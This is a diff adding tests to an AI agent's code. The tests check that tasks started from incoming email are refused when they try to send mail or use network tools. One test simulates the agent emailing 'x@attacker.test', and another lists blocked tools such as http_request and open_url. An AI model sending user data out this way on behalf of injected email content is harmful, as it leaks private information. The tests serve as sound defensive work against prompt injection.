@@ -278,3 +278,25 @@ def test_autonomy_hands_the_checked_recipients_to_the_agent_run(monkeypatch, tmp
     assert scope["now"] is None                                     # cleared after the run
     ok, why = A._run_action("email", {"body": "send this to whoever"})
     assert not ok and "no recipient" in why
+
+
+def test_a_task_that_came_from_an_email_cannot_send_email(J, monkeypatch):
+    sent = []
+    monkeypatch.setattr(J, "execute_mcp_tool", lambda name, inp: sent.append(inp) or "Email sent")
+    monkeypatch.setattr(J, "_log_action_audit", lambda *a, **k: None)
+    seen = []
+    monkeypatch.setattr(J, "run_agent_loop", lambda t, **k: seen.append(J._execute_tool(
+        "mcp_gmail_send_email", {"to": ["x@attacker.test"], "subject": "s", "body": "b"}, "x")) or "ok")
+    J._run_queued_task("from mail", f"{J.UNTRUSTED_TASK_MARKER} summarise the attachment")
+    assert seen and seen[0].startswith("Refused") and sent == []
+    J._command_ctx.untrusted_origin = False
+    assert J._execute_tool("mcp_gmail_send_email", {"to": ["x@ok.test"], "subject": "s", "body": "b"}, "x") == "Email sent"
+
+
+def test_an_email_started_task_has_no_way_to_post_data_to_a_server(J):
+    J._command_ctx.untrusted_origin = True
+    try:
+        for name in ("http_request", "download_image", "open_url", "play_media"):
+            assert J._untrusted_block(name), name
+    finally:
+        J._command_ctx.untrusted_origin = False
